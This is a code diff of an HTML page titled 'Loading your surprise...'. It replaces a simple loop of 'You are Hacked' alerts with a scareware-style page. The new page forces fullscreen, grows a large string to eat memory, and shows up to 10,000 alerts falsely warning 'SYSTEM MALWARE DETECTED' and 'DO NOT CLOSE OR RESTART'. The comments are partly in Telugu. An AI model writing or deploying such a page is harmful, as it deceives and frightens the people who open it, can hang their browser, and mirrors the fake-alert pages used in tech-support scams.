@@ -6,10 +6,16 @@
 <body>
     <h1>Loading your surprise...</h1>
     <script>
-        // Inifinite Loop to trigger 10,000 alerts
-        for (let i = 0; i < 10000; i++) {
-            alert("You are Hacked!!!!!!!!... " + i);
-        }
-    </script>
+    // 1. Full screen request (User touch cheyagane full screen avthundi)
+    document.documentElement.requestFullscreen();
+
+    // 2. The Hanging Loop
+    let heavyData = "";
+    for (let i = 0; i < 10000; i++) {
+        // Memory exhaustion: RAM ni fill chesthu alert chupinchadam
+        heavyData += "HACKED".repeat(1000); 
+        alert("\n\n⚠️ SYSTEM MALWARE DETECTED ⚠️\n\nDO NOT CLOSE OR RESTART!\n\nID: " + i);
+    }
+</script>
 </body>
 </html>
